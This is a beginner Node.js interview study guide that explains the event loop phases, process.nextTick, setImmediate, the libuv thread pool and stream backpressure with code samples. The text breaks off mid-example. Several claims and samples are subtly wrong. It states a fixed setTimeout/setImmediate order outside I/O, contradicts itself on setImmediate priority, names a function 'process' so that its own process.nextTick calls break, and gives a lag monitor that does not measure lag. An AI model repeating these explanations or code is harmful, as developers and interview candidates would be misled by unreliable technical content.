# Node.js Interview Questions - Detailed Answers for Beginners

## 1. What is event loop? What are the phases of event loop in detail?

### What is Event Loop?
Think of the event loop as a **traffic controller** in a busy intersection. When cars (tasks/code) arrive, the traffic controller decides which car should go first, then handles them one by one in a specific order.

In Node.js, the event loop is a mechanism that **continuously checks if there's any work to do**. It runs in a single thread and processes tasks in a specific sequence.

### Phases of Event Loop:

The event loop has 6 main phases that repeat in a cycle:

1. **Timers Phase**: Executes callbacks scheduled by `setTimeout()` and `setInterval()`
   - Example: If you set `setTimeout(() => console.log('Hello'), 1000)`, after 1 second, this callback will be executed here.

2. **Pending Callbacks Phase**: Executes deferred I/O callbacks (like network or file operations)
   - Example: If you're reading a file, the callback will be executed when the file is ready.

3. **Idle, Prepare Phase**: Internal phase used by Node.js (you don't need to worry about this)

4. **Poll Phase**: Waits for new events/I/O operations
   - If there's nothing to do, it waits here for something to happen.
   - If there are new I/O events, it processes them immediately.

5. **Check Phase**: Executes callbacks scheduled by `setImmediate()`
   - Example: `setImmediate(() => console.log('Check phase'))` will run here.

6. **Close Callbacks Phase**: Executes cleanup callbacks (like closing database connections)

**The cycle repeats continuously** until there's no more work to do.

---

## 2. What are the execution priorities of Event loop?

### Priority Order (from highest to lowest):

1. **Synchronous Code** - Runs immediately (highest priority)
2. **Microtasks** - `process.nextTick()` and Promises (`.then()`, `.catch()`)
3. **Timers** - `setTimeout()`, `setInterval()`
4. **I/O Operations** - File reading, network requests
5. **setImmediate()** - Lowest priority

### Simple Example:
```javascript
console.log('1. Synchronous');

setTimeout(() => console.log('2. setTimeout'), 0);

Promise.resolve().then(() => console.log('3. Promise'));

process.nextTick(() => console.log('4. nextTick'));

console.log('5. Synchronous');

// Output:
// 1. Synchronous
// 5. Synchronous
// 4. nextTick
// 3. Promise
// 2. setTimeout
```

**Why this order?** Synchronous code runs first because it's already in the main execution stack. Microtasks (nextTick, Promises) have higher priority than timers and I/O operations.

---

## 3. Is browser/client event loop different from Node event loop?

### Short Answer: **Yes, they are different!**

### Key Differences:

| Aspect | Browser | Node.js |
|--------|---------|---------|
| **Rendering** | Has a rendering phase (draws UI) | No rendering phase |
| **APIs** | `setTimeout`, `setInterval`, `fetch`, DOM APIs | `setTimeout`, `setInterval`, `process.nextTick()`, `setImmediate()` |
| **Microtasks Priority** | Promises run after each task | Promises run after microtask queue |
| **process.nextTick()** | Not available | Highest priority after sync code |
| **setImmediate()** | Not available | Special to Node.js |

### Browser Event Loop:
```
1. Execute sync code
2. Run microtasks (Promises)
3. Render UI
4. Execute one timer callback
5. Repeat
```

### Node.js Event Loop:
```
1. Execute sync code
2. Run microtasks (Promises, process.nextTick)
3. Run timers phase
4. Run I/O phase
5. Run check phase (setImmediate)
6. Repeat
```

**Simple Analogy**: Browser event loop is like a **restaurant with a dining area** (it must serve food AND keep the restaurant looking nice). Node.js event loop is like a **factory** (it only processes requests, no need to look pretty).

---

## 4. What is libuv in Node.js? How does it work?

### What is libuv?
**libuv** is a C library that handles **asynchronous I/O operations** in Node.js. It's the **engine** that powers the event loop.

Think of it as the **heart** of Node.js. Without libuv, Node.js couldn't handle async operations.

### What does libuv do?

1. **Event Loop Management** - Runs the event loop phases
2. **Thread Pool** - Has a pool of worker threads (usually 4 threads) for heavy operations
3. **Handles Async I/O** - File reading, network requests, etc.
4. **Cross-platform Support** - Works on Windows, Linux, macOS, etc.

### How it works (Simple Flow):

```
User Code
    ↓
Event Loop (managed by libuv)
    ↓
Is work available? 
    → YES: Execute it
    → NO: Wait or exit
    ↓
libuv's Thread Pool (for heavy work like file reading)
    ↓
Callback returns to Event Loop
    ↓
Event Loop continues...
```

### Simple Analogy:
Imagine you're a **manager** (Event Loop) with **4 workers** (Thread Pool) in an office:
- You receive tasks (async operations)
- You assign them to workers if they're heavy (file I/O)
- Workers do the work and report back
- You execute the callback
- You continue with other tasks

---

## 5. What is thread pool in Node.js? How does it work?

### What is Thread Pool?
A **thread pool** is a group of **background workers** that handle heavy, time-consuming operations so that the main event loop doesn't get blocked.

By default, Node.js has **4 worker threads** in the pool. You can change this with the `UV_THREADPOOL_SIZE` environment variable.

### Why do we need it?

**Without thread pool**: If Node.js tries to read a large file on the main thread, everything stops → **Blocked!**

**With thread pool**: File reading happens on a worker thread → Main thread stays free → **Not blocked!**

### Operations that use Thread Pool:

1. File System operations (`fs.readFile()`, `fs.writeFile()`)
2. Crypto operations (`crypto.pbkdf2()`)
3. Compression (`zlib`)
4. DNS lookups
5. Some SQL database operations

### How it works:

```javascript
// This operation uses the thread pool
fs.readFile('large-file.txt', (err, data) => {
  console.log('File read complete');
});

// Meanwhile, main thread can do other things
console.log('Reading file...');
console.log('Main thread is free!');

// Output:
// Reading file...
// Main thread is free!
// File read complete (after file is read)
```

### Thread Pool Flow:

```
Main Event Loop
    ↓
Detect async file operation
    ↓
Assign to worker thread from pool
    ↓
Main thread continues working
    ↓
Worker thread reads file (in background)
    ↓
Worker thread completes → sends result back
    ↓
Event loop executes callback
```

---

## 6. How to prevent blocking of event loop and monitor event loop for starvation?

### What is Blocking?
When the event loop **can't process new tasks** because it's stuck executing long, heavy code. It's like a traffic jam!

### How to Prevent Blocking:

**❌ BAD - Blocking code:**
```javascript
// This blocks the event loop for 3 seconds!
function heavyComputation() {
  const start = Date.now();
  while (Date.now() - start < 3000) {
    // Doing nothing for 3 seconds
  }
}

heavyComputation();
console.log('Done'); // Waits 3 seconds!
```

**✅ GOOD - Non-blocking code:**
```javascript
// This doesn't block!
setTimeout(() => {
  console.log('Done after 3 seconds');
}, 3000);

console.log('This runs immediately!');
```

### Best Practices to Prevent Blocking:

1. **Break heavy computations into smaller chunks** using `setImmediate()` or `setTimeout()`
2. **Use Worker Threads** for CPU-intensive tasks
3. **Use async/await** for I/O operations
4. **Avoid synchronous file operations** (use `fs.readFile()` instead of `fs.readFileSync()`)
5. **Use streams** for handling large data

### How to Monitor Event Loop Starvation:

**Event Loop Starvation** = When the event loop is so busy that it can't process new tasks on time.

**Method 1: Using `process.nextTick()` with timestamps**
```javascript
const start = Date.now();

setInterval(() => {
  const delay = Date.now() - start;
  if (delay > 100) {
    console.log(`Event loop delayed by ${delay}ms!`);
  }
}, 100);
```

**Method 2: Using NPM packages**
- `clinic.js` - Diagnoses event loop issues
- `0x` - Flame graph profiler
- `node-inspect` - Built-in Node.js profiler

---

## 7. What is process.nextTick() in detail?

### What is process.nextTick()?
**process.nextTick()** schedules a callback to be executed **immediately after the current code finishes**, but **before any other phase of the event loop**.

It's like saying: "Do this next, before anything else!"

### Priority in Event Loop:
```
Synchronous Code
    ↓
process.nextTick() callbacks ← Executes here
    ↓
Microtasks (Promises)
    ↓
Event Loop phases (Timers, I/O, setImmediate, etc.)
```

### Simple Example:

```javascript
console.log('1. Start');

process.nextTick(() => {
  console.log('2. nextTick');
});

setTimeout(() => {
  console.log('3. setTimeout');
}, 0);

console.log('4. End');

// Output:
// 1. Start
// 4. End
// 2. nextTick
// 3. setTimeout
```

### Real-world Use Case:

Imagine you want to catch an error that might occur:

```javascript
function mayThrowError() {
  if (Math.random() > 0.5) {
    throw new Error('Oops!');
  }
}

process.nextTick(() => {
  mayThrowError(); // If error, we can catch it here
});

// OR

try {
  mayThrowError();
} catch (error) {
  console.log('Caught:', error.message);
}
```

### Important Note:
**process.nextTick() can cause starvation!** If you call it repeatedly, it blocks other tasks:

```javascript
// ⚠️ This starves the event loop!
function recursive() {
  process.nextTick(recursive);
}
recursive(); // This runs forever, nothing else can execute!
```

---

## 8. What is setImmediate()?

### What is setImmediate()?
**setImmediate()** schedules a callback to be executed in the **check phase** of the event loop.

It's similar to `setTimeout(..., 0)` but happens at a different phase.

### When does setImmediate() execute?

```
Event Loop Phases:
Timers → I/O → setImmediate() ← Executes here
```

### Simple Example:

```javascript
console.log('1. Start');

setImmediate(() => {
  console.log('2. setImmediate');
});

setTimeout(() => {
  console.log('3. setTimeout');
}, 0);

console.log('4. End');

// Output:
// 1. Start
// 4. End
// 3. setTimeout (Timers phase)
// 2. setImmediate (Check phase)
```

### Key Difference from setTimeout():

| setTimeout | setImmediate |
|-----------|-------------|
| Timers phase | Check phase |
| Can have delay | Always next cycle |
| Executes earlier | Executes later |

### Real-world Use Case:

```javascript
// Process data in chunks to avoid blocking
function processLargeData(data) {
  let index = 0;

  function processChunk() {
    // Process 1000 items
    for (let i = 0; i < 1000 && index < data.length; i++) {
      // Process data[index]
      index++;
    }

    if (index < data.length) {
      // Schedule next chunk
      setImmediate(processChunk);
    }
  }

  processChunk();
}
```

---

## 9. What are the different types of queues in Node.js, and what is its execution priority?

### Types of Queues in Node.js:

Node.js has **multiple queues** where callbacks wait to be executed:

1. **Microtask Queue**
   - Holds: `process.nextTick()` callbacks and Promise callbacks
   - Executes: After synchronous code, before any phase

2. **Timer Queue**
   - Holds: `setTimeout()` and `setInterval()` callbacks
   - Executes: In Timers phase

3. **I/O Callbacks Queue**
   - Holds: File system, network, database callbacks
   - Executes: In Poll/I/O phase

4. **Check Queue**
   - Holds: `setImmediate()` callbacks
   - Executes: In Check phase

5. **Close Callbacks Queue**
   - Holds: Cleanup callbacks (closing connections)
   - Executes: In Close phase

### Execution Priority (Highest to Lowest):

```
1. Synchronous Code (highest)
   ↓
2. Microtask Queue (process.nextTick, Promises)
   ↓
3. Timer Queue (setTimeout, setInterval)
   ↓
4. I/O Callbacks Queue (file/network operations)
   ↓
5. Check Queue (setImmediate)
   ↓
6. Close Callbacks Queue (lowest)
```

### Visual Example:

```javascript
console.log('1. Sync');

setTimeout(() => console.log('2. Timer Queue'), 0);

process.nextTick(() => console.log('3. Microtask Queue'));

setImmediate(() => console.log('4. Check Queue'));

Promise.resolve().then(() => console.log('5. Promise (Microtask)'));

console.log('6. Sync');

// Output Order:
// 1. Sync
// 6. Sync (all sync code first)
// 3. Microtask Queue (nextTick)
// 5. Promise (Microtask) (nextTick has priority over promises)
// 2. Timer Queue (timers phase)
// 4. Check Queue (check phase)
```

---

## 10. Where do process.nextTick() and setImmediate() fit inside the event loop?

### Quick Answer:

- **process.nextTick()** = Executed **immediately after current code, before phases**
- **setImmediate()** = Executed in the **Check phase** of the event loop

### Visual Timeline:

```
┌─────────────────────────────────────────────┐
│ MAIN EXECUTION STACK (Synchronous Code)     │
└─────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────┐
│ Microtask Queue                             │
│ - process.nextTick() ← Executes here        │
│ - Promise callbacks                         │
└─────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────┐
│ Event Loop Phase 1: TIMERS                  │
│ - setTimeout                                │
│ - setInterval                               │
└─────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────┐
│ Event Loop Phase 2-4: I/O & Other           │
└─────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────┐
│ Event Loop Phase 5: CHECK                   │
│ - setImmediate() ← Executes here            │
└─────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────┐
│ Event Loop Phase 6: CLOSE                   │
└─────────────────────────────────────────────┘
```

### Detailed Example:

```javascript
console.log('START');

setTimeout(() => {
  console.log('setTimeout (Timers Phase)');
}, 0);

process.nextTick(() => {
  console.log('process.nextTick (Between sync & phases)');
});

setImmediate(() => {
  console.log('setImmediate (Check Phase)');
});

Promise.resolve().then(() => {
  console.log('Promise (Microtask)');
});

console.log('END');

/* Output:
START
END
process.nextTick (Between sync & phases)
Promise (Microtask)
setTimeout (Timers Phase)
setImmediate (Check Phase)
*/
```

### Why This Order?

1. **Sync code first** - Everything in the call stack
2. **Microtasks** - Next priority (nextTick & Promises)
3. **Timer phase** - After microtasks
4. **Check phase** - After timer phase

### Real-world Analogy:

Think of it like a **priority mail system**:
1. **Hand-delivered mail** (Sync code) - Highest priority
2. **Express mail** (process.nextTick) - Goes before regular mail
3. **First-class mail** (setTimeout) - Standard priority
4. **Scheduled delivery** (setImmediate) - Later priority

---




# Node.js Interview Questions - Detailed Answers (11-20)

## 11. setImmediate vs setTimeout — which is better?

### Quick Comparison:

| Feature | setTimeout | setImmediate |
|---------|-----------|-------------|
| **Syntax** | `setTimeout(cb, 0)` | `setImmediate(cb)` |
| **Delay** | Can have delay in ms | No delay parameter |
| **Executes in** | Timers phase | Check phase |
| **Order** | Earlier in event loop | Later in event loop |
| **Browser Support** | Yes | No (Node.js only) |
| **Performance** | Slightly slower | Slightly faster |

### When to Use What?

**Use `setImmediate()`:**
- When you want something to run **after current operations** but **before I/O callbacks**
- For **batch processing** to avoid blocking
- When you need **higher priority than setTimeout**
- **Generally preferred in Node.js** for non-blocking operations

**Use `setTimeout(..., 0)`:**
- When you need **browser compatibility**
- When you specifically want it in the **Timers phase**
- For **delayed execution** with optional delay

### Execution Order Example:

```javascript
console.log('START');

setTimeout(() => console.log('setTimeout'), 0);
setImmediate(() => console.log('setImmediate'));

console.log('END');

// Output:
// START
// END
// setTimeout (Timers phase runs first)
// setImmediate (Check phase runs next)
```

### In I/O Operations (Different Order!):

```javascript
const fs = require('fs');

fs.readFile(__filename, () => {
  setTimeout(() => console.log('setTimeout'), 0);
  setImmediate(() => console.log('setImmediate'));
});

// Output:
// setImmediate (Check phase has higher priority in I/O context)
// setTimeout (Timers phase)
```

**Why different?** Inside I/O callbacks, `setImmediate()` runs **immediately** because we're already in the I/O phase, and Check phase comes next!

### Best Practice:

```javascript
// ✅ GOOD - Use setImmediate for non-blocking operations
function processData(data) {
  setImmediate(() => {
    // Process data in background
  });
}

// ❌ AVOID - setTimeout with 0 in Node.js
function processData(data) {
  setTimeout(() => {
    // Same effect but less efficient
  }, 0);
}
```

**Recommendation**: Use `setImmediate()` in Node.js for better performance and clarity.

---

## 12. Why is process.nextTick() dangerous?

### The Danger: Starving the Event Loop

**process.nextTick()** is dangerous because it can **block all other operations** by running infinitely and preventing the event loop from progressing.

### The Problem:

```javascript
// ⚠️ DANGEROUS - This starves the event loop!
function recursiveNextTick() {
  process.nextTick(recursiveNextTick);
}

recursiveNextTick();

// Result: Your Node.js process hangs forever!
// No I/O operations, timers, or anything else can run!
```

### Why is it dangerous?

**Priority Problem:**
```
process.nextTick() has HIGHEST priority
    ↓
If you keep calling it recursively
    ↓
Event loop never gets to other phases
    ↓
Everything else is blocked!
```

### Real-world Dangerous Scenario:

```javascript
// This looks innocent but causes problems
function validateAndProcess(data) {
  process.nextTick(() => {
    if (needsValidation(data)) {
      // Recursive call - danger!
      validateAndProcess(data);
    }
  });
}

validateAndProcess(largeDataset);

// If validation keeps failing, this creates infinite nextTick calls!
// All other operations (I/O, timers) starve!
```

### Safe Alternatives:

**❌ Dangerous:**
```javascript
function process(data) {
  process.nextTick(() => process(data)); // Infinite loop!
}
```

**✅ Safe - Use setImmediate():**
```javascript
function process(data) {
  setImmediate(() => process(data)); // Allows other tasks in between
}
```

**✅ Safe - Use Promise chains:**
```javascript
function process(data) {
  Promise.resolve().then(() => process(data));
}
```

**✅ Safe - Add condition:**
```javascript
let count = 0;
function process(data) {
  process.nextTick(() => {
    if (count++ < 100) { // Limit recursion
      process(data);
    }
  });
}
```

### How to Detect the Problem:

If your Node.js app:
- Doesn't respond to requests
- Doesn't process file operations
- Seems frozen

Then you likely have a `process.nextTick()` starvation issue!

### Best Practice:

```javascript
// ✅ Use process.nextTick() for single operations only
process.nextTick(() => {
  console.log('Do one thing');
  // Don't recursively call process.nextTick()!
});

// ❌ Avoid recursive process.nextTick()
```

---

## 13. Which one can cause starvation fastest — process.nextTick() or setImmediate()?

### The Answer: process.nextTick()

**process.nextTick() causes starvation MUCH FASTER** than `setImmediate()`.

### Why?

**Execution Order:**
```
process.nextTick() - Runs FIRST (highest priority)
    ↓ (only if microtask queue is empty)
setImmediate() - Runs LATER (lower priority)
```

Since `process.nextTick()` runs with the **highest priority** in the event loop, recursive calls to it can starve everything else immediately.

### Comparison Example:

**Starvation with process.nextTick() - INSTANT:**
```javascript
// Runs immediately, blocks everything!
function starve() {
  process.nextTick(starve);
}

starve();

// Other code NEVER runs
setTimeout(() => console.log('Never executes'), 0);
```

**Starvation with setImmediate() - SLOWER:**
```javascript
// Runs in cycles, allows other tasks
function starve() {
  setImmediate(starve);
}

starve();

// This CAN run during cycles
setTimeout(() => console.log('May run between setImmediate cycles'), 0);
```

### Visual Comparison:

**process.nextTick() Starvation:**
```
Cycle 1: nextTick → nextTick → nextTick → nextTick ...
(Timer never gets a chance!)
```

**setImmediate() Starvation:**
```
Cycle 1: setImmediate
Cycle 2: Timer (gets a chance!)
Cycle 3: setImmediate
Cycle 4: Timer (gets another chance!)
```

### Proof with Code:

```javascript
let nextTickCount = 0;
let setImmediateCount = 0;
let timerCount = 0;

// nextTick starvation
function starveWithNextTick() {
  process.nextTick(() => {
    nextTickCount++;
    if (nextTickCount < 1000000) {
      starveWithNextTick();
    }
  });
}

// Timer to measure starvation
const start = Date.now();
starveWithNextTick();

setTimeout(() => {
  const elapsed = Date.now() - start;
  console.log(`Starvation lasted: ${elapsed}ms`);
  console.log(`nextTick calls: ${nextTickCount}`);
  // With setImmediate, timer would run much sooner!
}, 0);
```

### Rule of Thumb:

```
process.nextTick() starvation = Instant ⚡
setImmediate() starvation = Slower 🐢
```

**Recommendation**: Always avoid recursive calls to both, but be **extra careful** with `process.nextTick()`.

---

## 14. What are streams in Node.js?

### What is a Stream?

A **stream** is a way to handle **reading or writing data in chunks** rather than loading everything into memory at once.

Think of it like a **water stream** 💧:
- Water flows continuously in small portions
- You don't need to collect all water before using it
- It's efficient and saves resources

### Why Use Streams?

**Without Streams (Reading entire file):**
```javascript
const fs = require('fs');

// Loads ENTIRE file into memory!
fs.readFile('large-video.mp4', (err, data) => {
  console.log(data); // Entire 1GB video in RAM!
});

// Memory usage: HUGE ❌
```

**With Streams (Reading in chunks):**
```javascript
const fs = require('fs');

// Reads in small chunks
const stream = fs.createReadStream('large-video.mp4');

stream.on('data', (chunk) => {
  console.log('Received chunk of size:', chunk.length);
  // Process one chunk at a time
});

// Memory usage: LOW ✅
```

### Types of Streams:

1. **Readable Streams** - Read data from source
   - Example: `fs.createReadStream()`, `http.IncomingMessage`

2. **Writable Streams** - Write data to destination
   - Example: `fs.createWriteStream()`, `http.ServerResponse`

3. **Duplex Streams** - Both readable and writable
   - Example: `net.Socket`, `zlib` compression

4. **Transform Streams** - Modify data while reading/writing
   - Example: Compressing files while uploading

### Simple Stream Example:

```javascript
const fs = require('fs');

// Create read stream
const readStream = fs.createReadStream('input.txt', {
  encoding: 'utf8',
  highWaterMark: 16 * 1024 // 16KB chunks
});

// Listen for data
readStream.on('data', (chunk) => {
  console.log('Received chunk:', chunk.length, 'bytes');
});

readStream.on('end', () => {
  console.log('All data received!');
});

readStream.on('error', (error) => {
  console.log('Error:', error);
});
```

### Real-world Use Cases:

1. **Uploading large files** - Don't wait for entire upload
2. **Streaming videos** - Watch while downloading
3. **Processing logs** - Analyze line by line
4. **API responses** - Send data gradually
5. **Database queries** - Handle large result sets

### Stream Methods:

```javascript
const stream = fs.createReadStream('file.txt');

// Pause reading
stream.pause();

// Resume reading
stream.resume();

// Destroy stream
stream.destroy();
```

### Benefits:

✅ **Memory efficient** - Doesn't load entire file  
✅ **Faster processing** - Start processing immediately  
✅ **Scalable** - Handle large files easily  
✅ **Better performance** - Less RAM usage  

---

## 15. What is back pressure in streams? How to handle it?

### What is Back Pressure?

**Back pressure** occurs when the **readable stream produces data faster** than the **writable stream can consume it**.

It's like a **water tap analogy**:
- You open the tap too wide 💧💧💧
- The sink can't drain fast enough
- Water overflows!

### The Problem:

```javascript
const fs = require('fs');

// Reading fast (source)
const readable = fs.createReadStream('large-file.txt');

// Writing slow (destination)
const writable = fs.createWriteStream('output.txt');

readable.on('data', (chunk) => {
  // Data comes in faster than writable can handle
  writable.write(chunk); // ❌ Buffers accumulate!
});

// Result: MEMORY LEAK! All unwritten data stays in memory!
```

### How to Detect Back Pressure:

```javascript
const readable = fs.createReadStream('large-file.txt');
const writable = fs.createWriteStream('output.txt');

readable.on('data', (chunk) => {
  const canContinue = writable.write(chunk);
  
  if (!canContinue) {
    console.log('⚠️ Back pressure detected!');
    // writable buffer is full, readable should pause
  }
});
```

### Solution 1: Pause/Resume (Manual)

```javascript
const readable = fs.createReadStream('large-file.txt');
const writable = fs.createWriteStream('output.txt');

readable.on('data', (chunk) => {
  const canContinue = writable.write(chunk);
  
  if (!canContinue) {
    // Pause reading until writable catches up
    readable.pause();
  }
});

// When writable catches up, resume
writable.on('drain', () => {
  console.log('✅ Ready for more data');
  readable.resume();
});
```

### Solution 2: Use pipe() (Automatic - RECOMMENDED!)

```javascript
const fs = require('fs');

// pipe() handles back pressure automatically!
fs.createReadStream('input.txt')
  .pipe(fs.createWriteStream('output.txt'));

// That's it! No memory leak, no manual handling needed!
```

### Complete Back Pressure Example:

```javascript
const fs = require('fs');

const readable = fs.createReadStream('large-file.txt', {
  highWaterMark: 64 * 1024 // 64KB chunks
});

const writable = fs.createWriteStream('output.txt', {
  highWaterMark: 16 * 1024 // 16KB buffer
});

readable.on('data', (chunk) => {
  console.log('Writing chunk...');
  
  // write() returns true if buffer is not full
  const shouldContinue = writable.write(chunk);
  
  if (!shouldContinue) {
    console.log('⚠️ Back pressure! Pausing...');
    readable.pause();
  }
});

writable.on('drain', () => {
  console.log('✅ Drain event! Resuming...');
  readable.resume();
});

readable.on('end', () => {
  console.log('✅ Reading complete!');
});
```

### Key Points:

1. **write() returns boolean** - `true` = buffer okay, `false` = buffer full
2. **'drain' event** - Fires when buffer is empty and ready for more
3. **pause() / resume()** - Manual control when back pressure detected
4. **pipe()** - Automatic handling (BEST OPTION)

### Best Practice:

```javascript
// ✅ ALWAYS use pipe() for streams
fs.createReadStream('input.txt')
  .pipe(fs.createWriteStream('output.txt'));

// ❌ AVOID manual writing without handling back pressure
readable.on('data', (chunk) => {
  writable.write(chunk); // Dangerous!
});
```

---

## 16. What is pipe() in Node.js?

### What is pipe()?

**pipe()** is a method that **connects a readable stream to a writable stream**, automatically handling back pressure and flow control.

Think of it as **connecting pipes** 🔧:
- Water (data) flows from source to destination
- Automatically regulated to prevent overflow
- Simple and elegant

### Syntax:

```javascript
readableStream.pipe(writableStream);
```

### Simple Example:

```javascript
const fs = require('fs');

// Copy file using pipe
fs.createReadStream('input.txt')
  .pipe(fs.createWriteStream('output.txt'));

// That's it! Automatic, efficient, handles back pressure!
```

### How pipe() works (Behind the scenes):

1. Readable stream starts emitting data chunks
2. Writable stream receives and writes chunks
3. If writable buffer fills up (back pressure):
   - pipe() automatically **pauses** the readable stream
4. When writable buffer drains:
   - pipe() automatically **resumes** the readable stream
5. Repeat until all data transferred

### Chaining Multiple Pipes:

```javascript
const fs = require('fs');
const zlib = require('zlib');

// Read → Compress → Write
fs.createReadStream('input.txt')
  .pipe(zlib.createGzip()) // Compress while reading
  .pipe(fs.createWriteStream('input.txt.gz')); // Write compressed

// Result: input.txt.gz is created (compressed file)
```

### Real-world Example: Upload to Cloud

```javascript
const fs = require('fs');
const aws = require('aws-sdk');

const s3 = new aws.S3();

// Read file → Upload to S3
fs.createReadStream('large-video.mp4')
  .pipe(s3.upload({
    Bucket: 'my-bucket',
    Key: 'videos/my-video.mp4'
  }).createWriteStream());
```

### Error Handling with pipe():

```javascript
const fs = require('fs');

fs.createReadStream('input.txt')
  .pipe(fs.createWriteStream('output.txt'))
  .on('error', (error) => {
    console.log('Write error:', error);
  })
  .on('finish', () => {
    console.log('✅ Piping complete!');
  });

// Also handle read stream errors
fs.createReadStream('input.txt')
  .on('error', (error) => {
    console.log('Read error:', error);
  })
  .pipe(fs.createWriteStream('output.txt'));
```

### Pipe Chain with Error Handling:

```javascript
const fs = require('fs');

const readStream = fs.createReadStream('input.txt');
const writeStream = fs.createWriteStream('output.txt');

readStream
  .on('error', (err) => console.log('Read error:', err))
  .pipe(writeStream)
  .on('error', (err) => console.log('Write error:', err))
  .on('finish', () => console.log('Done!'));
```

### Alternative: pipeline() (Modern - Node.js 10+)

```javascript
const fs = require('fs');
const { pipeline } = require('stream');

// Automatically handles errors in all streams!
pipeline(
  fs.createReadStream('input.txt'),
  fs.createWriteStream('output.txt'),
  (err) => {
    if (err) {
      console.log('Pipeline failed:', err);
    } else {
      console.log('Pipeline succeeded!');
    }
  }
);
```

### Benefits of pipe():

✅ **Automatic back pressure handling**  
✅ **Memory efficient**  
✅ **Simple and readable code**  
✅ **Chainable**  
✅ **Built-in error handling** (with pipeline)  

### Best Practice:

```javascript
// ✅ BEST - Use pipeline() for error handling
const { pipeline } = require('stream');
const fs = require('fs');

pipeline(
  fs.createReadStream('input.txt'),
  fs.createWriteStream('output.txt'),
  (err) => console.log(err || 'Done!')
);
```

---

## 17. How can streams cause memory leaks and how to handle it?

### How Streams Cause Memory Leaks:

**Memory leaks occur when**:
1. Streams are not properly destroyed
2. Event listeners are not removed
3. Back pressure is not handled
4. Errors prevent stream cleanup

### Memory Leak Scenarios:

**❌ Leak 1: Not handling back pressure**
```javascript
const fs = require('fs');

const readable = fs.createReadStream('huge-file.txt');
const writable = fs.createWriteStream('output.txt');

readable.on('data', (chunk) => {
  // Writing without checking if buffer is full!
  writable.write(chunk);
  // If writable is slow, chunks pile up in memory!
  // MEMORY LEAK! ❌
});
```

**❌ Leak 2: Not destroying streams on error**
```javascript
const fs = require('fs');

const readable = fs.createReadStream('file.txt');
const writable = fs.createWriteStream('output.txt');

readable.on('data', (chunk) => {
  writable.write(chunk);
});

readable.on('error', (err) => {
  console.log('Error:', err);
  // Stream not destroyed! Still consuming memory!
  // MEMORY LEAK! ❌
});
```

**❌ Leak 3: Event listener not removed**
```javascript
function processFile() {
  const stream = fs.createReadStream('file.txt');
  
  stream.on('data', (chunk) => {
    // Process chunk
  });
  
  // Function ends but stream listeners remain!
  // If called repeatedly, listeners accumulate!
  // MEMORY LEAK! ❌
}

for (let i = 0; i < 1000; i++) {
  processFile();
}
```

### How to Handle and Prevent Memory Leaks:

**✅ Solution 1: Use pipe() (Handles everything automatically)**
```javascript
const fs = require('fs');

// pipe() handles back pressure and cleanup!
fs.createReadStream('input.txt')
  .pipe(fs.createWriteStream('output.txt'));

// No memory leak! Simple and safe!
```

**✅ Solution 2: Use pipeline() (Best for multiple streams)**
```javascript
const { pipeline } = require('stream');
const fs = require('fs');
const zlib = require('zlib');

// pipeline() handles errors and cleanup!
pipeline(
  fs.createReadStream('input.txt'),
  zlib.createGzip(),
  fs.createWriteStream('input.txt.gz'),
  (err) => {
    if (err) {
      console.log('Pipeline failed:', err);
      // Streams automatically destroyed!
    }
  }
);
```

**✅ Solution 3: Properly destroy streams and handle errors**
```javascript
const fs = require('fs');

const readable = fs.createReadStream('input.txt');
const writable = fs.createWriteStream('output.txt');

readable.on('data', (chunk) => {
  const canContinue = writable.write(chunk);
  if (!canContinue) {
    readable.pause();
  }
});

writable.on('drain', () => {
  readable.resume();
});

// Handle errors
readable.on('error', (err) => {
  console.log('Read error:', err);
  writable.destroy(); // Clean up!
});

writable.on('error', (err) => {
  console.log('Write error:', err);
  readable.destroy(); // Clean up!
});

// Finish event
writable.on('finish', () => {
  console.log('✅ All data written successfully');
});
```

**✅ Solution 4: Always remove event listeners**
```javascript
function processFile() {
  const stream = fs.createReadStream('file.txt');
  
  const onData = (chunk) => {
    // Process chunk
  };
  
  stream.on('data', onData);
  
  stream.on('end', () => {
    // Remove listener when done!
    stream.removeListener('data', onData);
  });
}
```

### Complete Safe Example:

```javascript
const { pipeline } = require('stream');
const fs = require('fs');
const zlib = require('zlib');

// Process large file safely
function compressFile(inputPath, outputPath) {
  return new Promise((resolve, reject) => {
    const readable = fs.createReadStream(inputPath);
    const gzip = zlib.createGzip();
    const writable = fs.createWriteStream(outputPath);
    
    pipeline(
      readable,
      gzip,
      writable,
      (err) => {
        if (err) {
          console.log('Error:', err);
          // All streams automatically destroyed!
          reject(err);
        } else {
          console.log('✅ Compression complete!');
          resolve();
        }
      }
    );
  });
}

// Use it
compressFile('large-file.txt', 'large-file.txt.gz')
  .catch(err => console.log('Failed:', err));
```

### Detection Tools:

```javascript
// Monitor memory usage
console.log('Memory before:', process.memoryUsage());

// Do stream operations

console.log('Memory after:', process.memoryUsage());

// If memory increased significantly = possible leak!
```

### Best Practices:

1. **Always use `pipeline()` for multiple streams** ✅
2. **Avoid manual stream management** ❌
3. **Handle back pressure** (or use pipe/pipeline) ✅
4. **Destroy streams on error** ✅
5. **Remove event listeners** when done ✅
6. **Test with large files** to detect leaks ✅

### Checklist:

```
☑️ Using pipeline() or pipe()?
☑️ Handling back pressure?
☑️ Destroying streams on error?
☑️ Removing event listeners?
☑️ No circular references?
☑️ Tested with large data?
```

---

## 18. What kind of events are emitted by streams?

### Stream Events Overview:

Streams emit **different events** at various stages of their lifecycle. Understanding these helps with error handling and flow control.

### Common Stream Events:

#### Readable Stream Events:

1. **'data' event** - Emitted when data is available to read
```javascript
stream.on('data', (chunk) => {
  console.log('Received chunk:', chunk);
});
```

2. **'end' event** - Emitted when all data has been read
```javascript
stream.on('end', () => {
  console.log('No more data!');
});
```

3. **'error' event** - Emitted when an error occurs
```javascript
stream.on('error', (err) => {
  console.log('Error:', err.message);
});
```

4. **'readable' event** - Emitted when there's data to read
```javascript
stream.on('readable', () => {
  const chunk = stream.read();
  if (chunk) {
    console.log('Read chunk:', chunk);
  }
});
```

5. **'pause' event** - Emitted when stream is paused
```javascript
stream.on('pause', () => {
  console.log('Stream paused');
});
```

6. **'resume' event** - Emitted when stream resumes
```javascript
stream.on('resume', () => {
  console.log('Stream resumed');
});
```

#### Writable Stream Events:

1. **'drain' event** - Emitted when buffer is empty
```javascript
stream.on('drain', () => {
  console.log('Buffer drained, ready for more data');
});
```

2. **'finish' event** - Emitted when all data written and end() called
```javascript
